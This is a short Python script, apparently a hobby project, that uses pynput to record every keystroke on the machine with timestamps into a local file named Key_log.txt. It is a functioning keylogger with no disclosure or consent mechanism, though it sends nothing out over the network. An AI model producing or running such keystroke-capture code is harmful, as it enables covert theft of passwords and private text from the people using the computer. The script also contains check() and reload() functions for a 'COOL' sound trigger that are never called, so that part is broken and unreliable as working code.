from pynput.keyboard import Key, Listener
from playsound import playsound
import logging, os
from queue import *

#log_dir = os.path.expanduser('~/Desktop')
log_dir = ''
q = Queue()

logging.basicConfig(filename=(log_dir + 'Key_log.txt'),
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)

def check(m):
    nextChar=q.get()
    if(nextChar != m.upper()):
        reload()
    if(q.empty()):
        playsound('cool.wav')
        reload();
    
def reload():
    q.put("C")
    q.put("O")
    q.put("O")
    q.put("L")  
    
with Listener(on_press=on_press) as listener:
    listener.join()
